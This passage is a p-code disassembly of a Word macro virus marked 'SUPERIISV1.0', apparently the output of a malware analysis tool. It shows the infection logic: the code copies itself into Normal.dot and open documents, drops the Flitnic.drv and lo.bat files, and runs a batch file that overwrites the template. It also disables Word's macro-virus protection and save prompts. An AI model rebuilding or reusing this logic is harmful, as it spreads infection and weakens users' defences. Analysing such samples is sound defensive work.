' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #118:
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #119:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #120:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #121:
' 	Label NoDoc 
' Line #122:
' 	QuoteRem 0x0000 0x0014 "Save NormalTemplate:"
' Line #123:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #124:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #125:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #126:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #127:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.0"
' 	Eq 
' 	IfBlock 
' Line #128:
' 	LitDI2 0x0001 
' 	St NormT 
' Line #129:
' 	ExitFor 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	NextVar 
' Line #132:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #133:
' 	LitStr 0x000E "Sub AuToOpEn()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #134:
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #135:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #136:
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #137:
' 	Ld iiii 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' Line #138:
' 	Ld FullCodeD 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #139:
' 	Ld FullCodeN 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #140:
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	NextVar 
' Line #141:
' 	EndIfBlock 
' Line #142:
' 	QuoteRem 0x0000 0x0015 "Clean NormalTemplate:"
' Line #143:
' 	LitStr 0x0000 ""
' 	St l 
' Line #144:
' 	OnError (GoTo 0) 
' Line #145:
' 	OnError eb 
' Line #146:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #147:
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #148:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #149:
' 	Label esub 
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #151:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #152:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #153:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #154:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #155:
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #156:
' 	Ld a 
' 	LitDI2 0x0008 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #157:
' 	EndIfBlock 
' Line #158:
' 	Loop 
' Line #159:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #160:
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #161:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St a 
' Line #162:
' 	Ld a 
' 	LitDI2 0x0021 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St a 
' 	EndIf 
' Line #163:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo eb 
' 	EndIf 
' Line #164:
' 	Label eb 
' Line #165:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #166:
' 	Ld wdDialogToolsMacro 
' 	Ld Application 
' 	ArgsMemLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #167:
' 	LitVarSpecial (True)
' 	St ReInf 
' Line #168:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St ReInf 
' 	EndIf 
' Line #169:
' 	Label Reinfection 
' Line #170:
' 	Ld ReInf 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #171:
' 	QuoteRem 0x0000 0x000C "Reinfection:"
' Line #172:
' 	LitDI2 0x0000 
' 	St Acd 
' Line #173:
' 	LitDI2 0x0000 
' 	St NormT 
' Line #174:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #175:
' 	Ld NormalTemplate 
' 	ArgsMemCall OpenAsDocument 0x0000 
' Line #176:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	St NormAt 
' Line #177:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #178:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #179:
' 	Label look 
' Line #180:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #181:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #182:
' 	Ld inn 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #183:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #184:
' 	Ld FullCodeN 
' 	Paren 
' 	Ld inn 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #185:
' 	LitDI2 0x0014 
' 	St i 
' Line #186:
' 	ExitFor 
' Line #187:
' 	EndIfBlock 
' Line #188:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	NextVar 
' Line #189:
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #190:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #191:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #192:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #193:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #194:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #195:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #196:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #197:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #198:
' 	GoTo look 
' Line #199:
' 	EndIfBlock 
' Line #200:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #201:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo notemp 
' 	EndIf 
' Line #202:
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #203:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #204:
' 	EndIfBlock 
' Line #205:
' 	EndIfBlock 
' Line #206:
' 	LitDI2 0x0001 
' 	St i 
' Line #207:
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #208:
' 	Label notemp 
' Line #209:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #210:
' 	CloseAll 
' Line #211:
' 	Label look2 
' Line #212:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	St a 
' Line #213:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo NoDocL 
' 	EndIf 
' Line #214:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #215:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #216:
' 	Ld inn2 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #217:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #218:
' 	Ld FullCodeD 
' 	Paren 
' 	Ld inn2 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #219:
' 	LitDI2 0x0014 
' 	St i 
' Line #220:
' 	ExitFor 
' Line #221:
' 	EndIfBlock 
' Line #222:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	NextVar 
' Line #223:
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #224:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #225:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #226:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #227:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #228:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #229:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #230:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #231:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #232:
' 	GoTo look2 
' Line #233:
' 	EndIfBlock 
' Line #234:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "A"
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #235:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo noactsave 
' 	EndIf 
' Line #236:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #237:
' 	Label noactsave 
' Line #238:
' 	ElseBlock 
' Line #239:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #240:
' 	EndIfBlock 
' Line #241:
' 	EndIfBlock 
' Line #242:
' 	Label NoDocL 
' Line #243:
' 	ElseBlock 
' Line #244:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #245:
' 	LitDI2 0x0001 
' 	Ld a 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #246:
' 	Ld NormalTemplate 
' 	ArgsMemCall OpenAsDocument 0x0000 
' Line #247:
' 	LitVarSpecial (False)
' 	St NormAt 
' Line #248:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	St NormAt 
' Line #249:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #250:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #251:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #252:
' 	CloseAll 
' Line #253:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #254:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 ":Begin"
' 	PrintItemNL 
' Line #255:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	FnLen 
' 	St l 
' Line #256:
' 	Ld l 
' 	LitDI2 0x000A 
' 	Sub 
' 	St l 
' Line #257:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "If not exist "
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld l 
' 	ArgsLd LBound 0x0002 
' 	Concat 
' 	LitStr 0x0017 "~$Normal.dot goto start"
' 	Concat 
' 	PrintItemNL 
' Line #258:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "Goto Begin"
' 	PrintItemNL 
' Line #259:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 ":Start"
' 	PrintItemNL 
' Line #260:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld windir 
' 	LitStr 0x001D "\command\Attrib.exe -s -h -r "
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #261:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Copy/y "
' 	Ld windir 
' 	Concat 
' 	LitStr 0x000F "\System\lo.sys "
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #262:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld windir 
' 	LitStr 0x001D "\command\Attrib.exe -s -h -r "
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #263:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Copy/y "
' 	Ld windir 
' 	Concat 
' 	LitStr 0x000F "\System\lo.sys "
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #264:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld windir 
' 	LitStr 0x001D "\command\Attrib.exe -s -h -r "
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #265:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Copy/y "
' 	Ld windir 
' 	Concat 
' 	LitStr 0x000F "\System\lo.sys "
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #266:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #267:
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoBat 
' 	EndIf 
' Line #268:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #269:
' 	Label NoBat 
' Line #270:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #271:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St al 
' Line #272:
' 	LitDI2 0x0001 
' 	Ld al 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #273:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #274:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #275:
' 	EndIfBlock 
' Line #276:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #277:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #278:
' 	EndSub 
' Line #279:
' 	FuncDefn (Sub Flitnic())
' Line #280:
' 	Label Begin 
' Line #281:
' 	OnError eb 
' Line #282:
' 	LitVarSpecial (False)
' 	St NormAt 
' Line #283:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #284:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #285:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #286:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #287:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #288:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #289:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #290:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #291:
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #292:
' 	Ld a 
' 	LitDI2 0x0008 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #293:
' 	EndIfBlock 
' Line #294:
' 	Loop 
' Line #295:
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #296:
' 	OnError NoInf 
' Line #297:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #298:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #299:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #300:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #301:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.0"
' 	Eq 
' 	IfBlock 
' Line #302:
' 	LitDI2 0x0001 
' 	St Acd 
' Line #303:
' 	ExitFor 
' Line #304:
' 	EndIfBlock 
' Line #305:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #306:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #307:
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #308:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #309:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #310:
' 	Ld ii 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' Line #311:
' 	Ld FullCodeN 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #312:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	NextVar 
' Line #313:
' 	EndIfBlock 
' Line #314:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #315:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #316:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #317:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #318:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.0"
' 	Eq 
' 	IfBlock 
' Line #319:
' 	LitDI2 0x0001 
' 	St NormT 
' Line #320:
' 	ExitFor 
' Line #321:
' 	EndIfBlock 
' Line #322:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	NextVar 
' Line #323:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #324:
' 	LitStr 0x000E "Sub AuToOpEn()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #325:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #326:
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #327:
' 	Ld iiii 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' Line #328:
' 	Ld FullCodeD 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #329:
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	NextVar 
' Line #330:
' 	EndIfBlock 
' Line #331:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #332:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #333:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #334:
' 	Ld NormalTemplate 
' 	ArgsMemCall OpenAsDocument 0x0000 
' Line #335:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	St NormAt 
' Line #336:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #337:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #338:
' 	Label look 
' Line #339:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #340:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #341:
' 	Ld inn 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #342:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #343:
' 	Ld FullCodeN 
' 	Paren 
' 	Ld inn 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #344:
' 	LitDI2 0x0014 
' 	St i 
' Line #345:
' 	ExitFor 
' Line #346:
' 	EndIfBlock 
' Line #347:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	NextVar 
' Line #348:
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #349:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #350:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #351:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
